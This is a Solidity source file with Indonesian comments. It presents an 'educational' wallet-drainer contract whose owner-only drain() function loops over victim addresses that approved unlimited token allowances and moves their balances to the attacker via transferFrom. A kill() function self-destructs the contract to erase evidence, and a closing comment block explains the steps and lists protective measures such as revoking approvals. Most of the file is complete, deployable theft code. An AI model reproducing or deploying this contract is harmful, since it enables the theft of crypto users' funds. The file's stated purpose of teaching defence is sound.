// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// ⚠️ CONTOH EDUKASI — BUKAN UNTUK DIGUNAKAN ⚠️
// Pattern yang dipake oleh drainer contract

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

contract EdukasiDrainer {
    address public owner;
    mapping(address => bool) public isVictim;
    
    event LogDrain(address indexed token, address indexed from, uint256 amount);
    
    constructor() {
        owner = msg.sender;
    }
    
    /// @notice PHASE 1: User APPROVE token ke contract ini
    /// User panggil: USDC.approve(address(this), unlimited)
    /// Maka: allowance[user][this] = max
    
    /// @notice PHASE 2: Attacker panggil function ini
    /// @param users Daftar wallet yang udah approve
    /// @param token Address token (USDC, WETH, dll)
    function drain(address[] calldata users, address token) external {
        require(msg.sender == owner, "Not owner");
        
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            
            // Cek allowance — apakah user udah approve?
            uint256 allow = IERC20(token).allowance(user, address(this));
            
            if (allow > 0) {
                // Ambil saldo user
                uint256 balance = IERC20(token).balanceOf(user);
                
                if (balance > 0) {
                    uint256 amount = allow < balance ? allow : balance;
                    
                    // transferFrom(user -> attacker)
                    IERC20(token).transferFrom(user, owner, amount);
                    
                    emit LogDrain(token, user, amount);
                }
            }
        }
    }
    
    /// @notice PHASE 3: Selfdestruct — hilangin bukti
    function kill() external {
        require(msg.sender == owner, "Not owner");
        selfdestruct(payable(owner));
    }
}

/*
=============================================
ANALISA CODE:
=============================================

1️⃣ Constructor
   - Nyimpen owner = attacker address
   - Cuma attacker yang bisa panggil drain()

2️⃣ Fungsi drain(address[], address)
   - INPUT: array wallet korban + token address
   - LOOP: cek allowance tiap wallet
   - TRANSFER: panggil transferFrom(user, attacker, amount)

3️⃣ Fungsi kill()
   - selfdestruct → contract ilang
   - Tapi Tx history tetap ada di blockchain

4️⃣ KENAPA BISA 112 WALLET?
   - Loop array 112 address
   - Masing-masing cek allowance + balance
   - Kalo ada approve → ambil semua

5️⃣ KENAPA APPROVAL BERTAHAN?
   - allowance[] di token contract PERSISTEN
   - Gak hilang sampe di-revoke
   - Attacker bisa drain kapan aja

6️⃣ PROTEKSI:
   ✅ Jangan approve unlimited
   ✅ Revoke approval di revoke.cash
   ✅ Pake wallet terpisah buat approve
   ✅ Cek contract address sebelum sign
=============================================
*/
